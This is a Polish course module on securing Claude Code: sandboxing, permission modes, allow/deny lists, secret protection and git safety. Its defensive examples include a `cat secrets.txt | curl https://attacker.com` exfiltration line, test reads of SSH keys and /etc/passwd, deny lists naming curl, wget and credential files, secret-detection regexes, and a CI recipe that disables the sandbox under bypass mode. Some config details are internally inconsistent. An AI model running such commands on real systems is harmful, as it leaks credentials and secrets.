Oto szczegółowo rozbudowana agenda **MODUŁU BEZPIECZEŃSTWO I UPRAWNIENIA**. Każdy punkt z oryginalnej agendy został uzupełniony o praktyczne przykłady, techniczne wskazówki (pro-tipy) oraz ciekawe pomysły na zastosowanie w codziennej pracy, bazując na dokumentacji i doświadczeniach ekspertów.

---

### **MODUŁ BEZPIECZEŃSTWO I UPRAWNIENIA (2-4h)**

Celem tego modułu jest nauczenie kursantów, jak skonfigurować Claude Code, aby był **skutecznym**, ale **niedestrukcyjnym** partnerem. Kluczem jest zasada *Least Privilege* (najmniejszych uprawnień) przy zachowaniu płynności pracy.

#### **1. Sandbox Mode – Podstawy**
*   **Zagadnienie:** Czym jest sandbox i jak chroni system przed nieautoryzowanym dostępem.
    *   *Wyjaśnienie:* Claude Code działa w wirtualnej piaskownicy. Domyślnie nie widzi niczego poza katalogiem, w którym został uruchomiony. To twoja pierwsza linia obrony przed wyciekiem danych (np. kluczy SSH z katalogu domowego).
*   **Przykład praktyczny:**
    *   Uruchom Claude w folderze `/my-project`. Poproś go: `Read ~/.ssh/id_rsa`.
    *   **Wynik:** Claude odmówi dostępu lub zgłosi błąd, ponieważ plik leży poza dozwolonym drzewem katalogów.
*   **Ciekawy pomysł:** Spróbuj poprosić Claude'a o "listę plików na pulpicie" będąc w katalogu projektu. To doskonały test weryfikujący, czy izolacja działa poprawnie przed rozpoczęciem pracy z wrażliwymi danymi.

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Testowanie granic sandbox**
    *   Komenda testowa: `claude "read /etc/passwd"` (Linux/Mac) lub `claude "read C:\Windows\System32\drivers\etc\hosts"` (Windows)
    *   **Oczekiwany wynik:** Odmowa dostępu z komunikatem "Permission denied: path outside sandbox"
    *   **Pro-tip:** Zapisz sobie zestaw testów weryfikujących sandbox przed wdrożeniem w zespole. Uruchom je po każdej aktualizacji Claude Code.

*   **Typowy błąd: Mylenie sandbox z kontenerem Docker**
    *   Sandbox to **izolacja na poziomie aplikacji**, nie wirtualizacja. Claude nadal działa w twoim systemie operacyjnym.
    *   Błąd: Zakładanie, że sandbox chroni przed `rm -rf /` – to NIE jest prawda! Sandbox ogranicza tylko dostęp do katalogów, nie blokuje destrukcyjnych komend w obrębie dozwolonego obszaru.
    *   **Rozwiązanie:** Używaj deny list dla niebezpiecznych komend (patrz sekcja 5).

*   **Edge case: Symlinki i hardlinki**
    *   Symlink wskazujący poza sandbox może ominąć ochronę w niektórych konfiguracjach.
    *   **Test:** Stwórz symlink: `ln -s ~/.ssh/id_rsa /my-project/link_to_key` i poproś Claude o `Read link_to_key`.
    *   **Oczekiwane zachowanie:** Nowoczesne wersje Claude Code (>1.5) rozwiązują symlinki i blokują dostęp. Jeśli to nie działa – zgłoś bug.

*   **Integracja: Sandbox + Docker dla maksymalnej izolacji**
    *   Dla projektów z wysokimi wymaganiami bezpieczeństwa (fintech, healthcare), uruchamiaj Claude w kontenerze Docker:
    ```bash
    docker run -it -v $(pwd):/workspace -w /workspace anthropics/claude-code:latest
    ```
    *   Podwójna izolacja: sandbox aplikacji + izolacja kontenera = maksymalne bezpieczeństwo.

*   **Troubleshooting: "Sandbox disabled" warning**
    *   Jeśli widzisz to ostrzeżenie, sprawdź `settings.json`: `"sandbox": {"enabled": false}` oznacza wyłączony sandbox.
    *   **Debug:** Uruchom `claude --debug` i poszukaj linii zawierającej "Sandbox initialization". Jeśli widzisz "SKIPPED" – sprawdź uprawnienia do katalogu `.claude/`.

#### **2. Konfiguracja Sandbox**
*   **Zagadnienie:** Włączanie/wyłączanie sandbox w `settings.json`.
    *   *Konfiguracja:* W pliku `.claude/settings.json`: `"sandbox": {"enabled": true}`.
    *   *Tip:* Użyj `autoAllowBashIfSandboxed: true`, jeśli ufasz środowisku sandbox. Pozwala to na automatyczne wykonywanie komend Bash, o ile są one izolowane.
*   **Zagadnienie:** `additionalDirectories` – rozszerzanie dostępu poza projekt.
    *   *Przykład praktyczny:* Pracujesz w monorepo, gdzie biblioteki są w folderze obok.
    *   *Konfiguracja:* `"additionalDirectories": ["../shared-utils/", "/opt/company-tools/"]`. Dzięki temu Claude może analizować zależności z sąsiednich katalogów bez otwierania dostępu do całego dysku.
*   **Zagadnienie:** Kiedy i DLACZEGO wyłączać sandbox (bardzo rzadko!).
    *   *Ostrzeżenie:* Wyłączenie sandboxa w settings.json (`"sandbox": {"enabled": false}`) daje agentowi dostęp do całego systemu plików.
    *   *Use Case:* Używaj tego trybu **wyłącznie** w jednorazowych, izolowanych kontenerach Docker lub maszynach wirtualnych do zadań typu "napraw mi cały system operacyjny".

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Konfiguracja dla monorepo z Turborepo/Nx**
    ```json
    {
      "sandbox": {
        "enabled": true,
        "additionalDirectories": [
          "../packages",
          "../shared",
          "../tooling",
          "/usr/local/share/company-configs"
        ]
      }
    }
    ```
    *   **Pro-tip:** Używaj ścieżek absolutnych dla globalnych narzędzi, relatywnych dla struktury projektu. To ułatwia przenoszenie konfiguracji między maszynami.

*   **Typowy błąd: Zbyt szerokie `additionalDirectories`**
    *   Błąd: `"additionalDirectories": ["/Users/username"]` – to faktycznie wyłącza sandbox!
    *   **Lepsze podejście:** Precyzyjnie wskazuj tylko potrzebne katalogi: `["/Users/username/.config/custom-tool", "/Users/username/company-templates"]`
    *   **Weryfikacja:** Użyj `/add-dir` slash command lub sprawdź `.claude/settings.json` aby zobaczyć skonfigurowane ścieżki.

*   **Edge case: Ścieżki relatywne vs absolutne**
    *   Ścieżki relatywne (`../shared`) są rozwiązywane względem katalogu projektu (gdzie znajduje się `.claude/`).
    *   Problem: Jeśli masz wiele projektów w różnych lokalizacjach, ścieżka relatywna może wskazywać na błędny katalog.
    *   **Rozwiązanie:** Dla współdzielonych zasobów używaj zmiennych środowiskowych:
    ```json
    "additionalDirectories": ["${COMPANY_LIBS_PATH}", "${HOME}/.local/share/templates"]
    ```

*   **Integracja: Sandbox z systemami CI/CD**
    *   W GitHub Actions/GitLab CI ustaw sandbox tylko na katalog workspace:
    ```yaml
    - name: Run Claude Code
      run: |
        echo '{"sandbox":{"enabled":true},"permissions":{"mode":"bypassPermissions"}}' > .claude/settings.json
        claude "analyze and fix tests"
    ```
    *   **Bezpieczeństwo:** Sandbox chroni runner przed wyciekiem sekretów z innych katalogów (np. `/home/runner/.ssh`).

*   **Troubleshooting: "Cannot access additional directory"**
    *   **Przyczyna:** Katalog nie istnieje lub brak uprawnień do odczytu.
    *   **Debug:**
    ```bash
    ls -la /ścieżka/z/additionalDirectories
    # Sprawdź czy katalog istnieje i czy masz uprawnienia rx (read+execute)
    ```
    *   **Rozwiązanie:** Dodaj sprawdzenie w skrypcie inicjalizacyjnym:
    ```bash
    if [ ! -d "/opt/company-tools" ]; then
      echo "Warning: /opt/company-tools not found, some features may be unavailable"
    fi
    ```

#### **3. Typy Uprawnień – Poziomy Ryzyka**
*   **Zagadnienie:** `Read` (niskie ryzyko) – tylko odczyt plików.
    *   *Przykład:* `> explain @src/auth.ts`. Ryzyko: Claude przeczyta plik `.env` i wyśle API key do chmury w kontekście rozmowy.
    *   *Tip:* Zawsze blokuj odczyt plików z sekretami (patrz punkt 6).
*   **Zagadnienie:** `Edit`/`Write` (średnie ryzyko) – modyfikacja/tworzenie plików.
    *   *Ryzyko:* Nadpisanie działającego kodu błędną wersją lub usunięcie kluczowych plików konfiguracyjnych.
    *   *Zabezpieczenie:* Claude Code używa checkpointów (migawek), więc zazwyczaj można cofnąć zmiany komendą `/undo` lub `git checkout`.
*   **Zagadnienie:** `Bash` (wysokie ryzyko) – wykonywanie komend systemowych.
    *   *Przykład:* `npm install` jest bezpieczne, ale `rm -rf` może być katastrofalne. Claude potrafi uruchamiać skrypty, które same w sobie mogą być niebezpieczne.
*   **Zagadnienie:** `Glob`/`Grep` (niskie ryzyko) – wyszukiwanie plików i zawartości.
    *   *Przykład:* `Glob(**/*.ts)` służy do mapowania struktury projektu. Jest to operacja bezpieczna i warto dodać ją do `allow` list, aby nie klikać "Yes" przy każdym wyszukiwaniu.

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Macierz ryzyka dla operacji**
    ```
    Read:        Ryzyko: 2/10  | Dozwolone: *.{js,ts,py,md} | Zablokowane: *.env, *.pem, *.key
    Edit/Write:  Ryzyko: 5/10  | Dozwolone: src/**, tests/** | Zablokowane: package*.json, *.lock
    Bash:        Ryzyko: 8/10  | Dozwolone: npm test, git status | Zablokowane: rm, sudo, curl|wget
    Glob/Grep:   Ryzyko: 1/10  | Dozwolone: wszystkie w sandbox | Zablokowane: brak
    ```
    *   **Pro-tip:** Stwórz tabelę z dopuszczalnymi operacjami dla różnych typów projektów (frontend, backend, infrastruktura).

*   **Typowy błąd: Auto-zezwalanie na Edit bez weryfikacji**
    *   Błąd: Włączenie "Accept edits mode" i zapomnienie o tym podczas refactoringu całej bazy kodu.
    *   **Scenariusz:** Claude modyfikuje 50 plików, z których 5 zawiera krytyczne błędy – trudno je potem wyłowić.
    *   **Rozwiązanie:** Używaj "Accept edits" tylko dla małych, izolowanych zadań. Po każdej sesji uruchom testy: `npm test && npm run lint`.

*   **Edge case: Bash z potokami (pipes) i przekierowaniami**
    *   Komenda: `cat secrets.txt | curl https://attacker.com` – wysyła sekrety mimo blokady `Read(secrets.txt)`!
    *   **Problem:** Deny list `Read(secrets.txt)` nie chroni przed odczytem przez Bash.
    *   **Rozwiązanie:** Blokuj także Bash dla wrażliwych plików:
    ```json
    "deny": [
      "Read(*.env)",
      "Bash(*cat*.env*)",
      "Bash(*grep*.env*)"
    ]
    ```

*   **Integracja: Webhooks dla operacji wysokiego ryzyka**
    *   Skonfiguruj webhook, który wysyła powiadomienie Slack/Teams gdy Claude wykonuje `Bash` komendę:
    ```json
    {
      "hooks": {
        "preToolUse": {
          "Bash": "curl -X POST https://hooks.slack.com/... -d '{\"text\":\"Claude wykonał: $COMMAND\"}'"
        }
      }
    }
    ```
    *   **Audit trail:** Wszystkie komendy lądują w kanale, zespół ma świadomość działań AI.

*   **Troubleshooting: "Permission denied" mimo allow list**
    *   **Przyczyna:** Kolejność reguł ma znaczenie – `deny` jest przetwarzane PRZED `allow`.
    *   **Debug:** Sprawdź kolejność w settings.json:
    ```json
    {
      "deny": ["Read(*.log)"],   // ❌ Ta reguła blokuje...
      "allow": ["Read(debug.log)"] // ❌ ...nawet jeśli to jest dozwolone
    }
    ```
    *   **Poprawka:** Użyj bardziej precyzyjnego deny: `"deny": ["Read(*.log)", "!Read(debug.log)"]` (negacja)

#### **4. Tryby Uprawnień – Kiedy Którego Użyć**
*   **Zagadnienie:** Normal mode – pełna kontrola.
    *   *Opis:* Claude pyta o każdą operację `Edit`, `Write`, `Bash`. Zalecane na początku pracy z nowym projektem.
    *   *Konfiguracja JSON:* `"permissions": {"mode": "default"}`
*   **Zagadnienie:** Accept edits mode – szybkie iteracje.
    *   *Skrót:* `Shift+Tab` przełącza na "accept edits on".
    *   *Działanie:* Automatycznie zatwierdza zmiany w plikach (`Edit`/`Write`), ale nadal pyta o komendy `Bash`. Idealne do sesji TDD (Test Driven Development).
    *   *Konfiguracja JSON:* `"permissions": {"mode": "acceptEdits"}`
*   **Zagadnienie:** Plan mode – zero modyfikacji.
    *   *Komenda:* Przełącz używając `Shift+Tab` w REPL lub w settings.json.
    *   *Opis:* Agent tylko czyta i analizuje. Generuje plik Markdown z planem działania. Bezpieczna eksploracja nieznanego codebase'u.
    *   *Konfiguracja JSON:* `"permissions": {"mode": "plan"}`
*   **Zagadnienie:** Bypass mode – automatyzacja (NIEBEZPIECZNE!).
    *   *Uwaga:* Bypass mode omija wszystkie kontrole uprawnień.
    *   *Zastosowanie:* Tylko w CI/CD (GitHub Actions) lub wewnątrz Dockera. Nigdy na głównej maszynie deweloperskiej.
    *   *Konfiguracja JSON:* `"permissions": {"mode": "bypassPermissions"}`

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Macierz decyzyjna – który tryb wybrać**
    ```
    Scenariusz                          | Tryb              | Uzasadnienie
    -----------------------------------|-------------------|----------------------------------
    Pierwszy kontakt z projektem       | Normal            | Poznaj strukturę, nie psuj niczego
    Refactoring 1 komponentu           | Accept Edits      | Szybkie iteracje, ograniczony scope
    Code review cudzego PR             | Plan              | Analiza bez ryzyka zmian
    Naprawa testów w CI/CD             | Bypass (w Docker) | Automatyzacja, odizolowane środowisko
    Praca z wrażliwymi danymi (prod)   | Plan lub Read-Only| Zero możliwości modyfikacji
    ```

*   **Pro-tip: Tworzenie aliasów dla trybów**
    ```bash
    # W ~/.bashrc lub ~/.zshrc
    alias claude-explore="claude --permission-mode plan"
    alias claude-fix="claude --permission-mode accept-edits"
    alias claude-auto="docker run -v $(pwd):/workspace claude-code --permission-mode bypass"
    ```
    *   Zespół używa spójnych komend, zmniejsza ryzyko przypadkowego użycia niewłaściwego trybu.

*   **Typowy błąd: Zapominanie o wyłączeniu Accept Edits**
    *   Problem: Włączasz `Shift+Tab` do szybkiego fixa, a potem przez 2 godziny Claude modyfikuje wszystko bez pytania.
    *   **Rozwiązanie:** Dodaj do prompta w CLI wskaźnik aktywnego trybu:
    ```bash
    # Przykładowa konfiguracja shell prompt
    claude_mode=$(cat ~/.claude-session 2>/dev/null || echo "normal")
    PS1="[CLAUDE:$claude_mode] \w $ "
    ```
    *   Zawsze widzisz aktywny tryb w terminalu.

*   **Edge case: Plan mode z zapisem do pliku**
    *   Chcesz aby Claude wygenerował plan, ale automatycznie zapisał go do `PLAN.md`.
    *   Obejście:
    ```bash
    claude --permission-mode plan "analyze this codebase" > PLAN.md
    # LUB z konfiguracją w settings.json:
    {
      "planMode": {
        "outputFile": "docs/AI_ANALYSIS_{timestamp}.md"
      }
    }
    ```

*   **Integracja: Automatyczne przełączanie trybu według gałęzi git**
    *   Utwórz git hook (`.git/hooks/post-checkout`):
    ```bash
    #!/bin/bash
    BRANCH=$(git branch --show-current)
    if [[ $BRANCH == "main" || $BRANCH == "production" ]]; then
      echo '{"permissions":{"mode":"plan"}}' > .claude/settings.json
      echo "⚠️  CLAUDE: Plan mode (read-only) for protected branch"
    else
      echo '{"permissions":{"mode":"normal"}}' > .claude/settings.json
      echo "✓ CLAUDE: Normal mode for feature branch"
    fi
    ```
    *   Na `main` – tylko odczyt, na feature branches – pełne uprawnienia.

*   **Troubleshooting: "Bypass mode not working in CI"**
    *   **Objaw:** CI job wywala się z błędem "Permission denied" mimo konfiguracji bypass permissions.
    *   **Przyczyna:** Sandbox jest nadal aktywny i blokuje dostęp poza workspace.
    *   **Rozwiązanie:**
    ```yaml
    # GitHub Actions
    - name: Run Claude with full bypass
      run: |
        echo '{"sandbox":{"enabled":false},"permissions":{"mode":"bypassPermissions"}}' > .claude/settings.json
        claude "fix all tests"
      env:
        CLAUDE_ALLOW_UNSAFE: "true"  # Dodatkowa flaga bezpieczeństwa
    ```

#### **5. Allow/Deny Lists – Precyzyjna Kontrola**
*   **Zagadnienie:** Whitelisting dozwolonych operacji (`allow`).
    *   *Idea:* Zamiast klikać "Yes" sto razy, zezwól na bezpieczne, częste komendy.
    *   *Konfiguracja:* `"allow": ["Bash(npm run:*)", "Bash(git status)", "Bash(ls)", "Read(./src/**)"]`. Zauważ użycie dwukropka jako separatora dla argumentów.
*   **Zagadnienie:** Blacklisting niebezpiecznych operacji (`deny`).
    *   *Konfiguracja:* `"deny": ["Bash(rm:*)", "Bash(sudo:*)", "Read(*.env)"]`. To "twarda blokada" – Claude nawet nie zapyta o zgodę, operacja zostanie od razu odrzucona.
*   **Zagadnienie:** Ask list – wymuszenie pytania.
    *   *Przykład:* `"ask": ["Bash(git push:*)", "Edit(package.json)"]`. Nawet jeśli masz włączony tryb "Auto-Edit", te konkretne akcje zawsze wymuszą interakcję użytkownika.

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Konfiguracja dla projektu React + TypeScript**
    ```json
    {
      "permissions": {
        "allow": [
          "Read(src/**/*.{ts,tsx,js,jsx})",
          "Read(*.{json,md,yml})",
          "Bash(npm run test)",
          "Bash(npm run lint)",
          "Bash(git status)",
          "Bash(git diff)",
          "Edit(src/**/*.{ts,tsx})",
          "Glob(**/*)",
          "Grep(**/*)"
        ],
        "deny": [
          "Read(.env*)",
          "Read(**/*.key)",
          "Read(**/*.pem)",
          "Edit(package*.json)",
          "Edit(*.lock)",
          "Bash(rm:*)",
          "Bash(sudo:*)",
          "Bash(curl:*)",
          "Bash(wget:*)",
          "Bash(git push:--force*)"
        ],
        "ask": [
          "Bash(npm install*)",
          "Bash(git push*)",
          "Bash(git commit*)",
          "Edit(tsconfig.json)",
          "Edit(.gitignore)"
        ]
      }
    }
    ```

*   **Pro-tip: Używanie zmiennych w patterns**
    ```json
    {
      "variables": {
        "SECRET_PATTERNS": ".env*|*.key|*.pem|credentials.json",
        "SAFE_EXTENSIONS": "ts|tsx|js|jsx|py|md|json"
      },
      "deny": [
        "Read(**/{$SECRET_PATTERNS})"
      ],
      "allow": [
        "Read(**/*.{$SAFE_EXTENSIONS})"
      ]
    }
    ```
    *   Łatwiejsza konserwacja – modyfikujesz pattern w jednym miejscu.

*   **Typowy błąd: Zbyt szerokie wildcardy**
    *   Błąd: `"allow": ["Bash(*)"]` – zezwala na WSZYSTKIE komendy Bash!
    *   **Problem:** Claude może wykonać `rm -rf /`, `sudo reboot`, etc.
    *   **Poprawka:** Zawsze używaj konkretnych komend lub bezpiecznych prefixów:
    ```json
    "allow": [
      "Bash(npm:*)",
      "Bash(git:status|diff|log)",
      "Bash(pytest:*)",
      "Bash(ls:*)"
    ]
    ```

*   **Edge case: Escaping znaków specjalnych w patterns**
    *   Problem: Jak zablokować pliki z kropką w nazwie? `*.test.ts` nie zadziała poprawnie.
    *   **Rozwiązanie:** Użyj escape'owania lub globów:
    ```json
    "deny": [
      "Read(**/*.test.{ts,tsx})",  // ✓ Prawidłowo
      "Read(**/*.spec.*)"           // ✓ Prawidłowo
    ]
    ```

*   **Integracja: Shared permissions dla zespołu**
    *   Stwórz repozytorium `company-claude-configs` z gotowymi profilami:
    ```bash
    company-claude-configs/
    ├── frontend.json       # React/Vue/Angular
    ├── backend.json        # Node/Python/Go
    ├── devops.json         # Terraform/K8s
    └── data-science.json   # Jupyter/ML
    ```
    *   Deweloper importuje odpowiedni profil:
    ```json
    {
      "extends": "https://raw.githubusercontent.com/company/claude-configs/main/frontend.json",
      "permissions": {
        "allow": ["Edit(src/my-component/**)"]  // Dodatkowe uprawnienia lokalne
      }
    }
    ```

*   **Troubleshooting: Ask list nie działa w bypass mode**
    *   **Objaw:** `"ask": ["Bash(git push)"]` jest ignorowane, Claude pushuje bez pytania.
    *   **Przyczyna:** Bypass mode OMIJA wszystkie uprawnienia, włącznie z `ask`.
    *   **Rozwiązanie:** W bypass mode używaj `deny` zamiast `ask`:
    ```json
    {
      "permissions": {
        "mode": "bypassPermissions",
        "deny": ["Bash(git push:--force*)"]  // To zadziała nawet w bypass
      }
    }
    ```

#### **6. Ochrona Wrażliwych Plików**
*   **Zagadnienie:** Pattern matching dla secrets i credentials.
    *   *Przykład:* W `settings.json` dodaj reguły blokujące odczyt katalogów z kluczami i konfiguracją chmury.
    *   *Code:* `"deny": ["Read(*/.env*)", "Read(*/.aws/*)", "Read(*/.ssh/*)"]`.
*   **Zagadnienie:** Lock files i package.json.
    *   *Problem:* AI często próbuje aktualizować biblioteki bez potrzeby, psując build.
    *   *Rozwiązanie:* `"deny": ["Edit(*/package-lock.json)", "Edit(*/yarn.lock)"]`. Zmuś Claude do używania `npm install` zamiast ręcznej edycji lockfile'a.
*   **Zagadnienie:** Wykrywanie hardcoded secrets w kodzie.
    *   *Tip:* Użyj Haka (Hook) `PreToolUse`, który skanuje treść pliku przed zapisem (`Write`). Jeśli znajdzie wzorzec przypominający klucz API (np. `sk-proj-...`), zablokuje operację.

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Kompletna lista wrażliwych plików do zablokowania**
    ```json
    {
      "deny": [
        // Pliki środowiskowe
        "Read(**/.env*)",
        "Read(**/config.local.*)",
        "Read(**/.envrc)",

        // Klucze SSH i certyfikaty
        "Read(**/.ssh/**)",
        "Read(**/*.pem)",
        "Read(**/*.key)",
        "Read(**/*.p12)",
        "Read(**/*.pfx)",

        // Poświadczenia cloud
        "Read(**/.aws/**)",
        "Read(**/.azure/**)",
        "Read(**/.gcloud/**)",
        "Read(**/credentials.json)",
        "Read(**/serviceAccountKey.json)",

        // Tokeny i sekrety
        "Read(**/.npmrc)",
        "Read(**/.pypirc)",
        "Read(**/.docker/config.json)",
        "Read(**/secrets.yml)",

        // Lock files i wrażliwe konfiguracje
        "Edit(**/package-lock.json)",
        "Edit(**/yarn.lock)",
        "Edit(**/pnpm-lock.yaml)",
        "Edit(**/poetry.lock)",
        "Edit(**/Gemfile.lock)",

        // Bazy danych i backupy
        "Read(**/*.db)",
        "Read(**/*.sqlite*)",
        "Read(**/*.sql)",
        "Read(**/*.dump)"
      ]
    }
    ```

*   **Pro-tip: Hook do skanowania sekretów przed zapisem**
    *   Stwórz plik `.claude/hooks/pre-write.sh`:
    ```bash
    #!/bin/bash
    # Scan for potential secrets before allowing Write operation

    FILE_CONTENT="$1"

    # Regex patterns dla popularnych sekretów
    PATTERNS=(
      "(?i)(api[_-]?key|apikey)[\"']?\s*[:=]\s*[\"'][a-zA-Z0-9_-]{20,}[\"']"
      "(?i)(secret|password|passwd|pwd)[\"']?\s*[:=]\s*[\"'][^\"']{8,}[\"']"
      "(?i)sk-[a-zA-Z0-9]{32,}"  # OpenAI API keys
      "(?i)ghp_[a-zA-Z0-9]{36}"   # GitHub Personal Access Token
      "(?i)AKIA[0-9A-Z]{16}"      # AWS Access Key
    )

    for pattern in "${PATTERNS[@]}"; do
      if echo "$FILE_CONTENT" | grep -P "$pattern" > /dev/null; then
        echo "❌ BLOCKED: Detected potential secret in file content!"
        exit 1
      fi
    done

    echo "✓ No secrets detected"
    exit 0
    ```
    *   Konfiguracja w `settings.json`:
    ```json
    {
      "hooks": {
        "preToolUse": {
          "Write": ".claude/hooks/pre-write.sh"
        }
      }
    }
    ```

*   **Typowy błąd: Zapomnienie o plikach backup**
    *   Problem: `.env` jest zablokowane, ale Claude czyta `.env.backup`, `.env.old`, `.env.sample`.
    *   **Rozwiązanie:** Używaj szerszych patterns:
    ```json
    "deny": [
      "Read(**/.env*)",        // Blokuje .env, .env.local, .env.backup, etc.
      "Read(**/*secret*)",     // Wszystko ze słowem "secret"
      "Read(**/*credential*)"  // Wszystko ze słowem "credential"
    ]
    ```

*   **Edge case: Sekrety w plikach konfiguracyjnych (JSON/YAML)**
    *   Problem: `config.json` może zawierać API keys, ale trzeba zezwolić na edycję innych ustawień.
    *   **Obejście:** Użyj zasady "ask" z custom validatorem:
    ```json
    {
      "ask": ["Edit(config.json)"],
      "hooks": {
        "preToolUse": {
          "Edit(config.json)": "node .claude/validate-config.js"
        }
      }
    }
    ```
    *   Skrypt `.claude/validate-config.js` sprawdza czy zmiany dotyczą tylko dozwolonych kluczy.

*   **Integracja: Automatyczne skanowanie z git-secrets**
    *   Zainstaluj `git-secrets` i połącz z Claude:
    ```bash
    # Instalacja
    brew install git-secrets  # macOS

    # Konfiguracja patterns
    git secrets --add 'sk-[a-zA-Z0-9]{32,}'
    git secrets --add 'AKIA[0-9A-Z]{16}'

    # Hook w settings.json
    {
      "hooks": {
        "preToolUse": {
          "Write": "git secrets --scan-stdin"
        }
      }
    }
    ```
    *   Każdy zapis jest skanowany przez `git-secrets` przed wykonaniem.

*   **Troubleshooting: "File blocked but Claude reads it anyway"**
    *   **Objaw:** `"deny": ["Read(.env)"]` jest ustawione, ale Claude widzi zawartość .env.
    *   **Możliwe przyczyny:**
        1. Plik był już odczytany w wcześniejszej sesji (cache kontekstu)
        2. Deny pattern nie pasuje (np. `.env` vs `**/.env`)
        3. Plik jest czytany pośrednio przez Bash: `cat .env`
    *   **Debug:**
    ```bash
    # Test czy pattern działa
    claude --test-permission "Read(.env)"
    # Oczekiwany output: ❌ DENIED

    # Wyczyść cache
    rm -rf ~/.claude/cache

    # Zablokuj też dostęp przez Bash
    echo '{"deny":["Read(**/.env*)","Bash(*cat*.env*)","Bash(*less*.env*)"]}' > .claude/settings.json
    ```

#### **7. Git Safety Protocol**
*   **Zagadnienie:** Zasady bezpieczeństwa dla operacji git.
    *   *Reguła:* Claude nigdy nie powinien używać `git push --force` ani `--no-verify` (pomijanie hooków). Dodaj te flagi do `deny` list.
*   **Zagadnienie:** Commit message format z HEREDOC.
    *   *Problem:* Zwykłe `git commit -m "msg"` często psuje się przy wieloliniowych opisach w bashu.
    *   *Rozwiązanie:* Naucz Claude'a (przez `CLAUDE.md`) używać składni:
        ```bash
        git commit -F - <<EOF
        feat: message body
        EOF
        ```
        To zapobiega problemom z ucieczką znaków.
*   **Zagadnienie:** Amend protocol – kiedy używać `--amend`.
    *   *Best Practice:* Pozwól na `--amend` tylko wtedy, gdy ostatni commit nie został jeszcze wypchnięty (`push`). W przeciwnym razie zniszczysz historię w repozytorium zespołu.

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Kompletna konfiguracja Git Safety**
    ```json
    {
      "permissions": {
        "allow": [
          "Bash(git status)",
          "Bash(git diff*)",
          "Bash(git log*)",
          "Bash(git branch*)",
          "Bash(git checkout:*)",
          "Bash(git add:*)",
          "Bash(git commit:-m*)",
          "Bash(git commit:-F*)"
        ],
        "deny": [
          "Bash(git push:*--force*)",
          "Bash(git push:*-f*)",
          "Bash(git commit:*--no-verify*)",
          "Bash(git commit:*--amend*)",      // Kontrolowane przez ask
          "Bash(git reset:*--hard*)",
          "Bash(git clean:*-fd*)",
          "Bash(git rebase:*-i*)",           // Interactive mode nie działa w CLI
          "Bash(git cherry-pick:*--skip*)"
        ],
        "ask": [
          "Bash(git push*)",
          "Bash(git merge*)",
          "Bash(git rebase*)",
          "Bash(git stash:drop*)"
        ]
      }
    }
    ```

*   **Pro-tip: Git hook dla walidacji przed push**
    *   Stwórz `.git/hooks/pre-push`:
    ```bash
    #!/bin/bash
    # Sprawdź czy Claude próbuje pushować na protected branch

    BRANCH=$(git branch --show-current)
    REMOTE_URL=$(git config --get remote.origin.url)

    # Zablokuj push na main/master bez code review
    if [[ "$BRANCH" == "main" || "$BRANCH" == "master" ]]; then
      # Sprawdź czy to Claude (wykryj commit message footer)
      LAST_COMMIT_MSG=$(git log -1 --pretty=%B)
      if echo "$LAST_COMMIT_MSG" | grep -q "Co-Authored-By: Claude"; then
        echo "❌ BLOCKED: Claude nie może pushować bezpośrednio na $BRANCH"
        echo "Użyj Pull Request workflow zamiast direct push"
        exit 1
      fi
    fi

    # Zablokuj force push
    while read local_ref local_sha remote_ref remote_sha; do
      if [[ "$local_sha" != "$remote_sha" ]] && git merge-base --is-ancestor "$remote_sha" "$local_sha" 2>/dev/null; then
        : # Normal push, OK
      else
        echo "❌ BLOCKED: Wykryto próbę force push!"
        exit 1
      fi
    done

    exit 0
    ```
    *   Ustaw uprawnienia: `chmod +x .git/hooks/pre-push`

*   **Typowy błąd: Claude używa git amend po push**
    *   **Scenariusz:** Claude commituje, pushuje, znajduje błąd, robi `git commit --amend` i próbuje pushować = wymaga force push.
    *   **Rozwiązanie:** W `CLAUDE.md` dodaj instrukcję:
    ```markdown
    ## Git Workflow Rules

    - NEVER use `git commit --amend` after pushing to remote
    - If commit was already pushed and needs fixing:
      1. Create a NEW commit with the fix
      2. Use message: "fix: correct issue from previous commit"
    - Only use --amend if `git log @{u}..` shows commit is not pushed yet
    ```

*   **Edge case: Konflikt merge w CI/CD**
    *   Problem: Claude w trybie bypass próbuje zrobić `git merge` w CI, dostaje konflikt, nie może go rozwiązać interaktywnie.
    *   **Obejście:**
    ```yaml
    # GitHub Actions
    - name: Auto-merge main into feature
      run: |
        git config merge.ours.driver true
        git merge origin/main --no-edit || {
          echo "Merge conflict detected - aborting"
          git merge --abort
          exit 1
        }
    ```
    *   Alternatywnie: Blokuj merge w CI, wymuszaj rebase lokalnie.

*   **Integracja: Commitizen dla spójnych commit messages**
    *   Zainstaluj Commitizen w projekcie:
    ```bash
    npm install -D commitizen cz-conventional-changelog
    ```
    *   W `CLAUDE.md` dodaj:
    ```markdown
    ## Commit Message Format

    Always use Commitizen format via: `git cz` instead of `git commit`

    Format: <type>(<scope>): <subject>
    Types: feat, fix, docs, style, refactor, test, chore
    ```
    *   Konfiguracja dla Claude:
    ```json
    {
      "permissions": {
        "deny": ["Bash(git commit:-m*)"],  // Zablokuj zwykłe commity
        "allow": ["Bash(git cz)"]           // Wymuszaj Commitizen
      }
    }
    ```

*   **Troubleshooting: "Git hook failed, commit rejected"**
    *   **Objaw:** Claude próbuje commitować, pre-commit hook (np. linter) zawodzi, commit jest odrzucany.
    *   **Dobre zachowanie:** Claude powinien:
        1. Przeczytać output hooka
        2. Naprawić wskazane błędy
        3. Spróbować commitować ponownie
    *   **Debug:** Jeśli Claude ignoruje błędy:
    ```json
    {
      "hooks": {
        "postToolUse": {
          "Bash(git commit*)": "bash -c 'if [ $TOOL_EXIT_CODE -ne 0 ]; then echo \"Commit failed - check hook output above\"; fi'"
        }
      }
    }
    ```
    *   To wymusi na Claude'ie analizę outputu zamiast próby obejścia z `--no-verify`.

#### **8. Best Practices – Bezpieczna Konfiguracja**
*   **Zagadnienie:** Least privilege principle – minimalne uprawnienia.
    *   *Strategia:* Zacznij od zablokowania wszystkiego (domyślny tryb), a potem dodawaj do `allow` tylko to, co niezbędne (np. lintery, testy). Nie używaj `bypassPermissions` z lenistwa.
*   **Zagadnienie:** Environment-specific configurations.
    *   *Development:* Liberalna lista `allow` dla testów i linterów.
